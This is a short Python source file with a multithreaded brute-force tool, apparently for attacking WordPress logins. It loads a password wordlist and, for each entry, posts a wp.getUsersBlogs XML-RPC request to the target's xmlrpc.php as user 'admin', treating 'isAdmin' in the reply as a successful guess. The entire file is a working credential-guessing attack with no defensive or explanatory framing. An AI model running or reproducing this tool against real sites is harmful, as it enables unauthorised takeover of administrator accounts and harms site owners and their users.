import threading
import requests

class BruteEngine:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.wordlist = []
        self.successful_logins = []
        self.threads = []
        self.thread_limit = 10

    def load_wordlist(self, filepath):
        with open(filepath, 'r') as f:
            self.wordlist = [line.strip() for line in f if line.strip()]

    def _attempt_login(self, password):
        url = f"{self.target}/xmlrpc.php"
        headers = {"Content-Type": "text/xml"}
        payload = f"""
        <?xml version="1.0"?>
        <methodCall>
          <methodName>wp.getUsersBlogs</methodName>
          <params>
            <param><value><string>admin</string></value></param>
            <param><value><string>{password}</string></value></param>
          </params>
        </methodCall>
        """
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=5)
            if "isAdmin" in response.text:
                self.successful_logins.append(password)
                print(f"[+] Success with password: {password}")
        except Exception as e:
            print(f"[-] Request error for password {password}: {e}")

    def start(self):
        for pwd in self.wordlist:
            while threading.active_count() > self.thread_limit:
                pass
            t = threading.Thread(target=self._attempt_login, args=(pwd,))
            self.threads.append(t)
            t.start()

        for t in self.threads:
            t.join()

        return self.successful_logins
